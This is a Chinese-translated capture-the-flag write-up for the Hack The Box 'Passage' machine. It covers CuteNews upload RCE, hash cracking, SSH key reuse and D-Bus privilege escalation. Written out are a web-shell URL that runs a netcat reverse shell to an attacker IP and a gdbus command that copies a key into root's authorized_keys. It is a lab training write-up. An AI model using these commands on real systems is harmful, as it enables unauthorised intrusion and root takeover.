<html>
<head>
<title>HTB Passage [writeup]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB文章</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-passage-writeup-172490d4045e?source=collection_archive---------0-----------------------#2021-03-11">https://infosecwriteups.com/htb-passage-writeup-172490d4045e?source=collection_archive---------0-----------------------#2021-03-11</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="22fe" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">无限制文件上传| RCE |弱密码| d-bus漏洞</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi ki"><img src="../Images/184f2da4eaf80d5db93b208009a6b7db.png" data-original-src="https://miro.medium.com/v2/resize:fit:804/format:webp/1*qEr7OvYGS7vtnXfCjX-8Cg.png"/></div></figure><h2 id="c484" class="kq kr it bd ks kt ku dn kv kw kx dp ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">列举</h2><p id="aa30" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu kz lv lw lx ld ly lz ma lh mb mc md me im bi translated">Nmap TCP扫描输出</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi mf"><img src="../Images/35f29c880d4e831eb00b0173d87e2a3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YamfXdlb9jd9VWscHC8aNg.png"/></div></div></figure></div><div class="ab cl mk ml hx mm" role="separator"><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp"/></div><div class="im in io ip iq"><h2 id="1452" class="kq kr it bd ks kt ku dn kv kw kx dp ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">据点</h2><p id="1878" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu kz lv lw lx ld ly lz ma lh mb mc md me im bi translated"><strong class="lo iu"> ************端口80 HTTP * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><p id="1e1e" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">IP在端口80上运行，并有一个网页。在主页面的底部，写着powered by <strong class="lo iu"> CuteNews - PHP新闻管理系统。</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi mw"><img src="../Images/a7eafc7e3add34e6761184d8a7776e6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lDk6KBNoj_QDOBWVrrYmhA.png"/></div></div></figure><p id="cd17" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">在网址上输入‘cute news’，你会看到它的登录门户页面。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi mx"><img src="../Images/1147df27b7a11f0275c7211672182df1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*485kdASS7CE8vWIIus74WQ.png"/></div></div></figure><p id="b3e1" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">注意CuteNews版本2.1.2，搜索<a class="ae my" href="https://www.exploit-db.com/exploits/48458" rel="noopener ugc nofollow" target="_blank">漏洞利用</a>！</p><p id="3245" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">CuteNews 2.1.2易受“阿凡达”远程代码执行的攻击</p><h2 id="60b9" class="kq kr it bd ks kt ku dn kv kw kx dp ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">反向外壳</h2><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/f32636877b1656f8363132e2dc7757a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/1*E4PtkPIsXsuixt5pukgiYg.png"/></div></figure><div class="kj kk kl km gt ab cb"><figure class="na kn nb nc nd ne nf paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><img src="../Images/28604d959142c870e135e285997b8e7e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1372/format:webp/1*slLhiV7Esed3Zed8fBZ2ag.png"/></div></figure><figure class="na kn ng nc nd ne nf paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><img src="../Images/977922875e72dc77eb6ef882b7bca4cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:630/format:webp/1*1kARNgexyXk35t87J0nQyw.png"/></div></figure></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi nh"><img src="../Images/e346af8278a22bb657e6a8dbf7c9d3e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*c3IXn5MY6u7cRqZjWF33FQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi ni"><img src="../Images/9cf086978ccee55da7b596db263bd911.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AgIirVHX2_xMieEE_Xi0MQ.png"/></div></div></figure><p id="2c8f" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated"><code class="fe nj nk nl nm b">10.10.10.206/CuteNews/uploads/avatar_komz_avatar.php?cmd=nc 10.10.14.16 1234 -e “/bin/sh”</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi nn"><img src="../Images/e653ed8b748f815bccd4cac613e80ab3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bMFOBb-V-7HWIt0IxgwOZA.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi no"><img src="../Images/ef5baafa603793f16bcecdeabc75d7ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TQatepV_ecfZpUBg_mqIcg.png"/></div></div></figure><p id="e786" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">在主目录下找到两个用户:nadav和paul。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi np"><img src="../Images/ba338665bea046d2e4a22848ddd6ff32.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/format:webp/1*bIq1t8M_HbcjjVSwH-A6RQ.png"/></div></figure></div><div class="ab cl mk ml hx mm" role="separator"><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp"/></div><div class="im in io ip iq"><h2 id="2b08" class="kq kr it bd ks kt ku dn kv kw kx dp ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">横向运动</h2><p id="5b8c" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu kz lv lw lx ld ly lz ma lh mb mc md me im bi translated">在一些枚举之后，我发现一些哈希字符串是base64编码的。解码得到了我的散列码。</p><p id="480c" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated"><code class="fe nj nk nl nm b">locate user</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi nq"><img src="../Images/e7c7283b0cfa19ccccc7cf36dd31142a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CKIhLiEGz9PSms31AEkauA.png"/></div></div></figure><p id="24a1" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">这里，users.txt是空的。然而，在/users文件夹中有几个php文件，在这些文件中可以找到base64哈希。</p><p id="5483" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated"><code class="fe nj nk nl nm b">cat *</code>一起检查这些php文件中的所有内容。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi nr"><img src="../Images/46f712e19de2292179a4d0befe38a5ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AP4xMQwrP5-cf0wcOY8oFg.png"/></div></div></figure><p id="a409" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">最后，在反复尝试破解密码后，一个散列泄露了paul的敏感数据，包括密码散列。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi ns"><img src="../Images/a9d81944b3c5c45907bf0cece469ee6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wjpzSQ_36HNTVStou-WCbQ.png"/></div></div></figure><p id="8230" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">破解密码…</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi nt"><img src="../Images/badfc4bbbd48aa0eff2d8aaa73eba07f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J2PkjmAVPXFUkZn6r_1yLQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi nu"><img src="../Images/ac149d47e1ddce23abd57bdfaccbd00b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wE52mteMBk3TPsnWfaPmfA.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/5f34e782649078ff7867551456cb942e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1132/format:webp/1*Xt27LMNopKc0hz2_MpKyqw.png"/></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi nw"><img src="../Images/dc555a30d99e20b650f918458a1d7a76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uePEA3-pBVPdWWBVvy2IBA.png"/></div></div><figcaption class="nx ny gj gh gi nz oa bd b be z dk translated"><strong class="bd ks">成功了！！！</strong></figcaption></figure></div><div class="ab cl mk ml hx mm" role="separator"><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp"/></div><div class="im in io ip iq"><h1 id="9a47" class="ob kr it bd ks oc od oe kv of og oh ky jz oi ka lc kc oj kd lg kf ok kg lk ol bi translated">通道根</h1><h2 id="80e4" class="kq kr it bd ks kt ku dn kv kw kx dp ky kz la lb lc ld le lf lg lh li lj lk ll bi translated"><strong class="ak">权限提升</strong></h2><p id="1ac1" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu kz lv lw lx ld ly lz ma lh mb mc md me im bi translated">注意下面保罗和纳达夫共享同一个RSA公钥；这意味着保罗的私人密钥可以用来登录为纳达夫。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi om"><img src="../Images/9aa36e0bf058f4438d7a2567ed0a044c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6I_XiKkkmEeWuRqZFdiOHw.png"/></div></div></figure><p id="d94d" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated"><em class="on">确保复制的私钥的权限设置为‘600’</em></p><p id="2e67" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated"><em class="on">确保/etc/hosts中包含“passage或passage.htb”以解析主机名。</em></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi oo"><img src="../Images/cbd355be9e34d7a652a9b9824a4a5fc8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*arWkqqCbJUoMIbRL2iELDA.png"/></div></div></figure><p id="feb7" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">运行<code class="fe nj nk nl nm b">id</code>我们可以看到，与保罗不同，纳达夫属于<strong class="lo iu"> sudo </strong>组。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi op"><img src="../Images/cad03eb36eccc1c9c37eb7242415164c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AK7gyKeq15_y5HZy4h1G7w.png"/></div></div></figure><p id="66c2" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">接下来，搜索我们可以作为根权限执行的<strong class="lo iu"> suid </strong>文件。</p><p id="a851" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated"><code class="fe nj nk nl nm b">find / -perm -u=s -type f 2&gt;/dev/null</code></p><p id="d0aa" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">在这里寻找最薄弱的环节。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi oq"><img src="../Images/387a02a76eef629d95ec1c735bedd2c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3-sp3Q1iswzkPb0h3v_PeA.png"/></div></div></figure><p id="f96c" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">研究技术在这里起着非常关键的作用，否则你将会为一个非常具体的目标的正确利用而筋疲力尽。</p><p id="4ff9" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">搜索<strong class="lo iu"> dbus-1.0权限提升</strong>，你会发现一种可以利用的技术。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi or"><img src="../Images/d3ab594eecf7f95d020c7f61cff98c4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yWzzpfN8GlfNrUq9BWkHmQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi os"><img src="../Images/26699ea4eb5983471ec1af1bf0829340.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S1G81Ez3OWWe0qPznJxKnA.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi ot"><img src="../Images/f63cc0773343dde48c0b2a42d72b3af5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QOJNGJ4-dIxsRvMWq9qV9w.png"/></div></div></figure><p id="88c6" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated">从针对<a class="ae my" href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/" rel="noopener ugc nofollow" target="_blank"> d-bus漏洞</a>的文章中，要求您修改命令，以便将authorized_keys文件中nadav的公共rsa密钥保存到root的authorized _ keys中以便登录。</p><p id="a7f0" class="pw-post-body-paragraph lm ln it lo b lp mr ju lr ls ms jx lu kz mt lw lx ld mu lz ma lh mv mc md me im bi translated"><code class="fe nj nk nl nm b">gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi om"><img src="../Images/f4a059173d30e4edec32e2df082a7c50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ui-vb5ZPAic1pTpE6R5xMQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="mg mh di mi bf mj"><div class="gh gi ou"><img src="../Images/cd46dddb1241d44ac190f0456721d829.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XQUo16wq4YX_me25sLC6kg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/92f7fca8e6d32e2f758270937c156150.png" data-original-src="https://miro.medium.com/v2/resize:fit:1372/1*tnhgyf3BEPEwga1GmZ2uKw.gif"/></div></figure></div></div>    
</body>
</html>